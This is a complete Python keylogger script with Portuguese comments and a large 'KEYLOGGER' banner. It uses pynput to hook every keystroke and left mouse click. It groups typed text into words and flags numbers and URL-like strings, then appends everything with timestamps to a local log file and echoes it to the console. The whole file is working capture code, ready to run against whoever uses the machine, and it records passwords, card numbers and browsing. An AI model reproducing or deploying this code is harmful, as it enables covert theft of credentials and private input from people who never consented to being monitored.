from pynput import keyboard, mouse
import time
from urllib.parse import urlparse
import webbrowser
import os
from colorama import Fore, Style, init

# Inicializando o colorama
init(autoreset=True)

# Exibe o banner inicial
print(Fore.LIGHTCYAN_EX + Style.BRIGHT + """

██╗  ██╗███████╗██╗   ██╗██╗      ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
██║ ██╔╝██╔════╝╚██╗ ██╔╝██║     ██╔═══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
█████╔╝ █████╗   ╚████╔╝ ██║     ██║   ██║██║  ███╗██║  ███╗█████╗  ██████╔╝
██╔═██╗ ██╔══╝    ╚██╔╝  ██║     ██║   ██║██║   ██║██║   ██║██╔══╝  ██╔══██╗
██║  ██╗███████╗   ██║   ███████╗╚██████╔╝╚██████╔╝╚██████╔╝███████╗██║  ██║
╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                                                                                                                                                                                                                         
""")

# Define o arquivo onde as informações serão salvas
log_file = "meu_log.txt"

def escrever_no_log(texto, categoria="GERAL"):
    """Escreve no arquivo de log com timestamp e categoria, e exibe no CMD com cores específicas"""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    mensagem = f"[{timestamp}] [{categoria}] {texto}"
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(mensagem + "\n")
    
    # Define cores específicas para categorias
    if categoria == "URL":
        print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + mensagem)  # URLs em amarelo
    elif categoria == "TECLAS":
        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + mensagem)  # Teclas em verde
    elif categoria == "NUMERO":
        print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + mensagem)  # Números em roxo
    else:
        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + mensagem)  # Geral em verde (padrão)

def verificar_url(texto_digitado):
    """Verifica se o texto digitado parece uma URL"""
    texto = texto_digitado.lower()
    if texto.startswith("http") or texto.endswith(".com") or texto.endswith(".br") or "." in texto:
        return True
    return False

def iniciar_keylogger():
    """Inicia o keylogger com monitoramento de teclas, URLs e cliques do mouse"""
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "Keylogger iniciado. Pressione ESC para parar\n")
    escrever_no_log("=== Keylogger Iniciado ===\n", "SISTEMA")
    
    # Buffer para armazenar o que foi digitado
    buffer = ""
    
    # Mapeamento das teclas do Num Pad com Num Lock desativado
    numpad_keys_off = {
        keyboard.Key.end: "1",       # Num 1 sem Num Lock
        keyboard.Key.down: "2",      # Num 2 sem Num Lock
        keyboard.Key.page_down: "3", # Num 3 sem Num Lock
        keyboard.Key.left: "4",      # Num 4 sem Num Lock
        keyboard.Key.right: "6",     # Num 6 sem Num Lock
        keyboard.Key.home: "7",      # Num 7 sem Num Lock
        keyboard.Key.up: "8",        # Num 8 sem Num Lock
        keyboard.Key.page_up: "9",   # Num 9 sem Num Lock
        keyboard.Key.insert: "0"     # Num 0 sem Num Lock
    }
    
    # Mapeamento de códigos de teclas para números (teclado principal)
    number_keycodes_main = {
        48: "0",  # Tecla 0
        49: "1",  # Tecla 1
        50: "2",  # Tecla 2
        51: "3",  # Tecla 3
        52: "4",  # Tecla 4
        53: "5",  # Tecla 5
        54: "6",  # Tecla 6
        55: "7",  # Tecla 7
        56: "8",  # Tecla 8
        57: "9"   # Tecla 9
    }
    
    # Mapeamento de códigos de teclas para números (Num Pad com Num Lock ativado)
    number_keycodes_numpad = {
        96: "0",   # Num Pad 0
        97: "1",   # Num Pad 1
        98: "2",   # Num Pad 2
        99: "3",   # Num Pad 3
        100: "4",  # Num Pad 4
        101: "5",  # Num Pad 5
        102: "6",  # Num Pad 6
        103: "7",  # Num Pad 7
        104: "8",  # Num Pad 8
        105: "9"   # Num Pad 9
    }
    
    def on_press(key):
        nonlocal buffer
        try:
            # Converte a tecla para string, se for um caractere
            if hasattr(key, 'char') and key.char is not None:
                key_name = key.char
            else:
                # Tenta obter o código da tecla e mapeá-lo
                if hasattr(key, 'vk'):
                    if key.vk in number_keycodes_main:
                        key_name = number_keycodes_main[key.vk]
                    elif key.vk in number_keycodes_numpad:
                        key_name = number_keycodes_numpad[key.vk]
                    else:
                        key_name = str(key).replace("Key.", "")
                else:
                    key_name = str(key).replace("Key.", "")
            
            # Verifica tecla de saída
            if key_name == "esc":
                if buffer.strip():  # Salva o que estiver no buffer antes de encerrar
                    if verificar_url(buffer.strip()):
                        escrever_no_log(f"{buffer.strip()}", "URL")
                    else:
                        escrever_no_log(f"{buffer.strip()}", "TECLAS")
                return False  # Para o listener
            
            # Ignora teclas modificadoras
            if key_name in ["shift", "ctrl", "alt", "caps_lock", "tab"]:
                return
            
            # Processa teclas específicas
            if key_name in ["space", "enter"]:
                if buffer.strip():  # Salva o buffer como uma string completa
                    if verificar_url(buffer.strip()):
                        escrever_no_log(f"{buffer.strip()}", "URL")
                    else:
                        escrever_no_log(f"{buffer.strip()}", "TECLAS")
                buffer = ""  # Limpa o buffer após espaço ou enter
            elif key_name == "backspace":
                buffer = buffer[:-1] if buffer else buffer
            elif key_name in "0123456789":  # Captura números (teclado principal ou Num Pad com Num Lock ativado)
                buffer += key_name
                escrever_no_log(f"Número digitado: {key_name}", "NUMERO")
            elif key in numpad_keys_off:  # Captura números do Num Pad com Num Lock desativado
                num_value = numpad_keys_off[key]
                buffer += num_value
                escrever_no_log(f"Número digitado (Num Pad, Num Lock off): {num_value}", "NUMERO")
            elif len(key_name) == 1:  # Captura letras e outros caracteres únicos
                buffer += key_name
        except AttributeError:
            escrever_no_log(f"Erro ao processar tecla: {str(key)}", "ERRO")
    
    def on_click(x, y, button, pressed):
        nonlocal buffer
        if button == mouse.Button.left and pressed:  # Botão esquerdo do mouse pressionado
            if buffer.strip():  # Salva o buffer como uma string completa
                if verificar_url(buffer.strip()):
                    escrever_no_log(f"{buffer.strip()}", "URL")
                else:
                    escrever_no_log(f"{buffer.strip()}", "TECLAS")
            buffer = ""  # Limpa o buffer após o clique
    
    # Inicia os listeners para teclado e mouse
    keyboard_listener = keyboard.Listener(on_press=on_press)
    mouse_listener = mouse.Listener(on_click=on_click)
    
    keyboard_listener.start()
    mouse_listener.start()
    
    # Aguarda até pressionar 'esc'
    keyboard_listener.join()
    
    escrever_no_log("\n\n=== Keylogger Encerrado ===", "SISTEMA")
    print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + "\nKeylogger Encerrado")

if __name__ == "__main__":
    iniciar_keylogger()

input(Fore.LIGHTRED_EX + Style.BRIGHT + "\n\n========== PRESSIONE ENTER PARA SAIR ==========\n\n")   
